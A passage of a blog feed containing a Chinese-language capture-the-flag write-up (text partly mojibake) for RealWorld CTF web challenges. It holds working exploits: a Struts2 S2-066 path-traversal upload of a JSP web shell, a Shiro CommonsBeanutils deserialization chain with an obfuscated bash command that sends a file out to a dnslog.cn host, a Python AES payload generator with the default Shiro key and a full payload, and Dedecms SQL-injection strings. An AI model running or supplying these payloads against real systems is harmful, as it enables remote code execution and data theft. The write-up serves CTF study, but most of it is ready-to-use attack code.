class="keyword">private</span> File fileUpload;</span><br><span class="line">    <span class="keyword">private</span> String fileUploadContentType;</span><br><span class="line">    <span class="keyword">private</span> String fileUploadFileName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HeaderIconAction</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;input&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">doUpload</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">remoteAddr</span> <span class="operator">=</span> <span class="built_in">this</span>.request.getRemoteAddr();</span><br><span class="line">            <span class="type">String</span> <span class="variable">md5ForIp</span> <span class="operator">=</span> <span class="built_in">this</span>.md5Ip(remoteAddr);</span><br><span class="line">            <span class="type">File</span> <span class="variable">sandBox</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(UPLOAD_DIR, md5ForIp);</span><br><span class="line">            <span class="type">File</span> <span class="variable">fileToCreate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(sandBox, <span class="built_in">this</span>.fileUploadFileName);</span><br><span class="line">            FileUtils.copyFile(<span class="built_in">this</span>.fileUpload, fileToCreate);</span><br><span class="line">            <span class="built_in">this</span>.uploadedPath = <span class="string">&quot;statics/uploads/&quot;</span> + md5ForIp + <span class="string">&quot;/&quot;</span> + <span class="built_in">this</span>.fileUploadFileName;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var5) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">md5Ip</span><span class="params">(String ip)</span> <span class="keyword">throws</span> NoSuchAlgorithmException &#123;</span><br><span class="line">        <span class="type">MessageDigest</span> <span class="variable">md</span> <span class="operator">=</span> MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">        md.update(ip.getBytes());</span><br><span class="line">        <span class="type">byte</span>[] digest = md.digest();</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">byte</span>[] var5 = digest;</span><br><span class="line">        <span class="type">int</span> <span class="variable">var6</span> <span class="operator">=</span> digest.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var7</span> <span class="operator">=</span> <span class="number">0</span>; var7 &lt; var6; ++var7) &#123;</span><br><span class="line">            <span class="type">byte</span> <span class="variable">b</span> <span class="operator">=</span> var5[var7];</span><br><span class="line">            sb.append(String.format(<span class="string">&quot;%02x&quot;</span>, b &amp; <span class="number">255</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> File <span class="title function_">getFileUpload</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.fileUpload;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setFileUpload</span><span class="params">(File fileUpload)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.fileUpload = fileUpload;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getFileUploadContentType</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.fileUploadContentType;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setFileUploadContentType</span><span class="params">(String fileUploadContentType)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.fileUploadContentType = fileUploadContentType;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getFileUploadFileName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.fileUploadFileName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setFileUploadFileName</span><span class="params">(String fileUploadFileName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.fileUploadFileName = fileUploadFileName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUploadedPath</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.uploadedPath;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">withServletRequest</span><span class="params">(HttpServletRequest httpServletRequest)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.request = httpServletRequest;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åªèƒ½è§£æ<code>/views</code>ç›®å½•ä¸‹çš„<code>.jsp</code>æ–‡ä»¶ï¼Œå› æ­¤æŠŠjspé©¬ä¸Šä¼ åˆ°<code>/views</code>ã€‚</p><p>Struts2çš„ç‰ˆæœ¬æ˜¯<code>6.3.0</code>ï¼Œè¿™ä¸ªç‰ˆæœ¬çš„Struts2å­˜åœ¨<code>S2-066</code>ï¼Œåœ¨æ–‡ä»¶ä¸Šä¼ çš„æ—¶å€™å¯ä»¥è·¯å¾„ç©¿è¶Šã€‚</p><p>è¿™é‡Œæ³¨æ„çš„æ˜¯ï¼Œä¸Šä¼ æ—¶ï¼Œè¦å…ˆç”¨<code>fileUpload</code>å‚æ•°ä¸Šä¼ æˆåŠŸä¸€æ¬¡ï¼Œä¹‹åå†ç”¨<code>FileUpload</code>ä¸Šä¼ ï¼Œå³å¯å®ç°è·¯å¾„ç©¿è¶Šã€‚</p><p>jspé©¬ï¼š</p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class="line"><span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line"><span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>];</span><br><span class="line">out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">out.println(<span class="keyword">new</span> <span class="title class_">String</span>(b));</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="/./RealWorld/w_2_1.png"></p><p>è®¿é—®<code>/views/test.jsp</code>ï¼Œå³å¯rceï¼Œæ‰§è¡Œ<code>/readflag</code>å³å¯å¾—åˆ°flagã€‚</p><p><img src="/./RealWorld/w_2_2.png"></p><h2 id="Old-Shiro"><a href="#Old-Shiro" class="headerlink" title="Old-Shiro"></a>Old-Shiro</h2><p>åç¼–è¯‘jaråŒ…ï¼Œå¯ä»¥çœ‹åˆ°è´¦å·å¯†ç ï¼Œè¿˜çœ‹åˆ°äº†Cookieæœ‰ä¸€ä¸ª<code>rememberMe_rwctf_2024</code>ï¼Œæ˜¯Shiroååºåˆ—åŒ–çš„å…¥å£ã€‚</p><p>æŸ¥çœ‹ä¾èµ–æœ‰<code>cb-1.9.2</code>ï¼Œæ¥ä¸‹æ¥ç”¨cbé“¾å»æ‰“ã€‚</p><p>å› ä¸ºheaderé•¿åº¦çš„é™åˆ¶ï¼Œä¸èƒ½å‘é€è¿‡é•¿çš„Cookieï¼Œpayloadçš„é•¿åº¦æœ‰é™åˆ¶ã€‚</p><p>æŠŠæ²¡ç”¨çš„headeréƒ½å»æ‰ï¼Œ<code>POST</code>æ”¹æˆ<code>GET</code>ï¼Œæœ€ç»ˆå¯ä»¥å‘é€<code>2900</code>å·¦å³çš„å­—ç¬¦ï¼Œå› æ­¤ç”Ÿæˆçš„payloadé•¿åº¦è¦åœ¨<code>2900</code>ä»¥å†…ã€‚</p><p><strong>MyClassLoader</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClassLoader</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String[] cmdArray = &#123;<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;&#123;echo,Y3VybCBgY2F0IC9mbGFnfGJhc2U2NGAuNmtxeGd2LmRuc2xvZy5jbg==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>&#125;;</span><br><span class="line">            Runtime.getRuntime().exec(cmdArray);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>cmdArray</code>é‡Œä¸»è¦æ‰§è¡Œçš„å‘½ä»¤æ˜¯</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl `cat /flag|base64`.6kqxgv.dnslog.cn</span><br></pre></td></tr></table></figure><p><strong>CommonsBeanutilsShiroPayload</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.CB;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsBeanutilsShiroPayload</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//1.æ„é€ TemplatesImplå¯¹è±¡ï¼Œå…¶ä¸­codeå°±æ˜¯è¯»å–ç¬¬ä¸€æ­¥æ„é€ å¥½çš„ç±»åŠ è½½å™¨ã€‚</span></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\ctf_ide\\ysoserial-master\\target\\classes\\ysoserial\\MyClassLoader.class&quot;</span>));</span><br><span class="line">        System.out.println(code.length);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="comment">//setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImp);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.å®ä¾‹åŒ–BeanComparatorï¼Œå…¶ä¸­comparatorçš„éƒ¨åˆ†å°±ç”¨æˆ‘ä»¬æ‰¾åˆ°çš„æ›¿æ¢ç±»</span></span><br><span class="line"><span class="comment">//            BeanComparator comparator = new BeanComparator(null,String.CASE_INSENSITIVE_ORDER);</span></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, Collections.reverseOrder());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.å®ä¾‹åŒ–ä¼˜å…ˆé˜Ÿåˆ—PriorityQueueï¼Œå¦‚ä¸‹å› ä¸ºæˆ‘ä»¬ä¸Šé¢comparatoræ˜¯Stringç±»å‹ï¼Œæ‰€ä»¥åœ¨addçš„æ—¶å€™è¦ç”¨Stringç±»å‹çš„å­—ç¬¦ä¸²ã€‚</span></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,comparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4.åå°„å°†property çš„å€¼è®¾ç½®æˆæ¶æ„çš„outputProperties ï¼Œå°†é˜Ÿåˆ—é‡Œçš„ä¸¤ä¸ª1æ›¿æ¢æˆæ¶æ„çš„TemplateImpl å¯¹è±¡</span></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//5.åºåˆ—åŒ–åˆ°æ–‡ä»¶</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æœ€ç»ˆå°†ç”Ÿæˆçš„<code>test.bin</code>ç”¨<code>AES</code>åŠ å¯†å¹¶base64ç¼–ç ï¼Œå³å¯å¾—åˆ°é•¿åº¦ä¸º<code>2860</code>çš„payloadã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_file_data</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_enc</span>(<span class="params">data</span>):</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key  =  <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode =  AES.MODE_CBC</span><br><span class="line">    iv   =  uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># test.binä¸ºç¼–è¯‘å¥½çš„åºåˆ—åŒ–é“¾çš„å†…å®¹</span></span><br><span class="line">    data = get_file_data(<span class="string">&quot;test.bin&quot;</span>)</span><br><span class="line">    exp = aes_enc(data)</span><br><span class="line">    <span class="built_in">print</span>(exp)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(exp))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># b&#x27;kMNtUyJ+QnWeGtM6c7FSoZISa+WpmVjE5nsJyZS+6RyiYV3loy3inr5kavKuAjAAig4YDfNxHne9FIhbcXmwg7M1jiBzNoDOSdbTXdab3blpkN4U7DLGPWwZs5HonBDTqzmOSqbOeXZ696WNYSTovEVzS+WTai+/v6hYXAOFkuwLdda+K508E4ATzbuFVc+5BGS6+YF36aMBrQO95ShRG6UEnrAVh6NJJZiR+68cyUBFb0qloxZ+mxKeTzkIl5TtR0ojRTZIO2CqyzXyNANkb2gQka4x+sUUnXwNgWtu0I+o4aSDxwQofnRxWh8rkMEdUdOAD9JISYyBztM9cbVWtluLqaciEo6jmZDD3A8rXvPWcypq4XGUWq8jgUTZKx2oD1ugtUZJv7nvp0vgHLMw2XRG3q3MSycvuhMjLlyaXvmXSs67isYBadHt9MlFVrw5uml8EuhA/Nr33etTkruIkdoQcwAoNq60sWf37q64HFxpFOFm17XHrynd819qkOmoI2GGiqBsGzYr2kgO0LU2plJ/uSPcRtybtITtEUYFdv51UUYONZq3OkKsFko82MTx9ajJSMMnL53FAm0xlcsfa4a8gemUxEYf3DlWZE1ArHLCTY6UKtEGkhXbfSXdXUk8jcIDYuaU4amS1KGdMV45PMVaPDXi3djI70EIpKuGG0g9pPdSCcKbKXqaBxGy++1DK2Llc4EDghM0R2pyZn4F4E8U8r7CJBBzHV7VcVqbEdaO0NX4kdcbezlPXHcNyZYGGp0EXNyw1nileo873nW8/wKJhzWvRsdUq8N2EZFk3QsjFUiFsxjsArOLtHp4keLrtXsaFxWL96Jujz3FZXN3idnP2doXdAxB5FpenQrZdIxLb93PEXV8rrxZ+8jLDId4svnoWpc4usUnDbq8rFi90xfZrxU4kwiiNPrj7xrNOFLx690SnM0Fc9JsbCK5CS701Aw2WlVJ4037H00cDtdfVsbijVlYBaBNiXmI6m6jDYHdnytjU2Zv8gbP9mQm7MhgVyPphnRpb2zxRq+zXUerMwxAzMobVRsFandQkdbgTQxBNxhpcZgJopbyPU69qX8Zb4hX2M5FT4kHIghWJkX/EPJzGVo3Yaq/y6jyHVLBFWXPDK+2dx5AiB3AxUUnVvsJ1awafq65WSG/D1px9PoZvSyvQkb1PeuyQSrMhn95gmgHIK24aHVVxJ5v25L6vquYGFZGWgEjFmp/L3I65zTMleFvNiJqPu7E2U/3z2kJcsir7KtOd/23IkMQbDRPVndhOhNZTn8YasqsDsomRR56sSvDgle7hA4X3/jr1KQLlP1gjRLoa/i1A6UYNxXLMlTUMSLpEF5CUXZxhBYvg9BsRiqk2SlxAeqGzGNQtwktJ+A8iJvIwfAPusllyzCXJph3zw3ufraRydV6zP2INavM28KfyWdf17det/D6BUVADQDjD9YPCONa2FGrhM/dHY8CHS2jFejPoyh6paeZyUcfXKYI28GvGH1rB/fW+n7tNvtzs10nGvbnNUrBd1Ia6bF8oh4vwblShvWqq7rW9ycOFXs2Zepvbh3kh8bkynavLxRyQN68lunTOMkkcmCBR97q3Ax+7PUKhr/9NjNcAzdJgphNPIeZogoUXdQ73Eo2cu6ebocjIPh2bls04hr+goN3ThIAXyRSgqNVVe2Nki3w42Aky8lIA44GOvmlfuG97nzhmkhJLBWNupY7EAqNcz4IijS5JaT7EW6rEiQX8A5SOdvodyL5rQgG2iot/20pHLvm8kP77wW/G+fd5Pvn6Lu9Axee6xFHHjaNwWvb1kL+KWzCKXLPhdlli8kUdBzaqiZ08XRuYR0PRg9h6DHOeYXs2MIBPCZtF70k+/1Tf/x2ldb+PoZ5LpiaKF+3KtH0qebbkKR4JVMnL60HNEPmR0RS4HQVQlBwv1Euz1GF4byuztKi7pGajqw4NGrrcGGoqmvAa1OLALgAQa7Xp97su32tZS3B4ojyPz+vgoftqZjI3iq4jC6XJZFeOoDo02ab0nGhQOxtuVjTxfrs+35NcTcWeYX8YpVjBA4TMkTj1qrhWFcuGNzio9om2fKzNfRI66UkRiNPY6mfujj65vZg2yFOQOwLD4fF+ZQTQ9HDSIIhM9r9HXEw0Nt3QLIChOBD7IkufMV9wGrgwFexGbe86Mmn3wSegTJ/Eq0uWY59IvMBis+jnm7nxoiBnGwE4y/WYTLsFZH/53x81IHehMSsNg2MNJ0tpfm6hukUX3e6KHl+qszHrQBYJqg9Rz/U9j/v+BH84NKtsyXVKVDFQQJvNoUfx6N71k8T58i8oD/v1dweLqBImAIJqSSd5q2/rEIElM/mKtjLFYfTnIGpOIIKvRnTMvbfwvIap7XOHyNsk5xFSerhO/oTcDPxazIOaq/PY8k9dfRFH4h+Bwhqy5C0OuYR2Ca76jLWS7vwW3dKYwL+kJXX7miITZ5Z3sEcFM3Mjf1t4gOvdly/7CslQbzUSLvzWgoKZqESofNqWPMOJZf/w73LFUf9+l9LFVr60D1xjVIuob41nqzNznUaPD02CwPX8IhvJVZjhMFaSJht3Jd2VDqXQD9a/xcrWVXcKBsy7OVXgmbWBn6mV1/0pgh+laMJR/qvtYnBuwGGfV9ETITLbXNzdKCxVxejapKDV6Pm/KgYxg6c9X1KguUkj+ICCun0Pn+P506dAtcg7vtPFu92WPahcfXLw36EjD0kWW3mpye+NI7+x++eDOZ5qYBQQNsqBqJ/cuaAkE1pM04nxyA+bN9VAsQx0RQj35IflWGV1l8Jol1DfCAcPyDY/vaD4mmkGJ7TjQOJ8WRP1QWp1Ca3m0AtDZMchw46z3Xsk4j3VLg=&#x27;</span></span><br><span class="line"><span class="comment"># 2860</span></span><br></pre></td></tr></table></figure><p>å‘é€è¿‡å»</p><p><img src="/./RealWorld/w_3_1.png"></p><p>åœ¨dnslogå¾—åˆ°base64ç¼–ç åçš„flagï¼Œè§£ç å³å¯å¾—åˆ°flag</p><p><img src="/./RealWorld/w_3_2.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rwctf&#123;Sh0rT3r_Byt3c0d3_m4K3_L1f3_E4s13r&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="YourSqlTrick"><a href="#YourSqlTrick" class="headerlink" title="YourSqlTrick"></a>YourSqlTrick</h2><p>Dedecms v5.7.111å‰å°tags.php SQLæ³¨å…¥æ¼æ´</p><p>å‚è€ƒé“¾æ¥: <a href="https://github.com/wy876/POC/blob/main/Dedecms%20v5.7.111%E5%89%8D%E5%8F%B0tags.php%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md">Dedecms v5.7.111å‰å°tags.php SQLæ³¨å…¥æ¼æ´</a></p><p>æŠ“åŒ…ï¼Œå¯ä»¥åœ¨å›æ˜¾ä½2é‚£é‡Œçœ‹åˆ°å›æ˜¾</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tag=a/alias/about%27and&#123;`\%27`%20id&#125;%3E0.1union%20select%201,group_concat(table_name),123,4,5,6,7,8,9,10,11%20from%20information_schema.tables%20where%20table_schema=database()--%20\\</span><br></pre></td></tr></table></figure><p><img src="/./RealWorld/w_4_1.png"></p><p><strong>åº“å</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a/alias/about%27and&#123;`\%27`%20id&#125;%3E0.1union%20select%201,database(),3,4,5,6,7,8,9,10,11--%20\\</span><br></pre></td></tr></table></figure><p>å¾—åˆ°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dedecmsv57utf8sp2</span><br></pre></td></tr></table></figure><p><strong>è¡¨å</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a/alias/about%27and&#123;`\%27`%20id&#125;%3E0.1union%20select%201,group_concat(table_name),3,4,5,6,7,8,9,10,11%20from%20information_schema.tables%20where%20table_schema=database()--%20\\</span><br></pre></td></tr></table></figure><p>å¾—åˆ°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dede_downloads,dede_advancedsearch,dede_myadtype,dede_member_type,dede_uploads,dede_member_tj,dede_mytag,dede_admin,dede_admintype,dede_member_model,dede_area,dede_addonarticle,dede_addoninfos,dede_flinktype,dede_member_person,dede_purview,dede_member_snsmsg,dede_shops_products,dede_member_space,dede_member_group,dede_freelist,dede_addonspec,dede_softconfig,dede_arccache,dede_plus_seoinfo,dede_co_onepage,dede_sys_set,dede_vote_member,dede_member_operation,flag,dede_myad,dede_tagindex,dede_member_feed,dede_addonshop,dede_sys_enum,dede_sysconfig,dede_archives_log_list,dede_dl_log,dede_member_friends,dede_flink,dede_erradd,dede_sys_module,dede_homepageset,dede_member_vhistory,dede_shops_userinfo,dede_feedback,dede_taglist,dede_payment,dede_channeltype,dede_co_urls,dede_co_note,dede_moneycard_record,dede_search_cache,dede_member_pms,dede_member_company,dede_shops_delivery,dede_addonsoft,dede_diyforms,dede_stepselect,dede_co_htmls,dede_member_guestbook,dede_archives_log_detail,dede_addonimages,dede_scores,dede_arctiny,dede_archives,dede_member_flink,dede_member_msg,dede_sys_task,dede_sgpage,dede_pwd_tmp,dede_keywords,dede_moneycard_type,dede_member_stowtype,dede_arcatt,dede_shops_orders,dede_search_keywords,dede_arctype,dede_verifies,dede_log,dede_plus,dede_multiserv_config,dede_arcmulti,dede_member_stow,dede_member,dede_ratings,dede_vote,dede_arcrank,dede_co_mediaurls,dede_mtypes</span><br></pre></td></tr></table></figure><p>æœ‰ä¸€ä¸ª<code>flag</code>çš„è¡¨ï¼Œæ¥ä¸‹æ¥æ³¨<code>flag</code>è¡¨</p><p><strong>åˆ—å</strong></p><p>è·‘å‡º<code>flag</code>è¡¨çš„åˆ—å</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a/alias/about%27and&#123;`\%27`%20id&#125;%3E0.1union%20select%201,group_concat(column_name),3,4,5,6,7,8,9,10,11%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=&#x27;flag&#x27;--%20\\</span><br></pre></td></tr></table></figure><p>å¾—åˆ°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_value</span><br></pre></td></tr></table></figure><p><strong>æ•°æ®</strong></p><p>æ³¨å‡º<code>flag</code>è¡¨ä¸­çš„æ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a/alias/about%27and&#123;`\%27`%20id&#125;%3E0.1union%20select%201,concat(flag_value),3,4,5,6,7,8,9,10,11%20from%20flag--%20\\</span><br></pre></td></tr></table></figure><p>å¾—åˆ°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rwctf&#123;70adbbd8-b9da-11ee-9b1e-00163e01b905&#125;</span><br></pre></td></tr></table></figure><p><img src="/./RealWorld/w_4_2.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpååºåˆ—åŒ–</title>
      <link href="/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
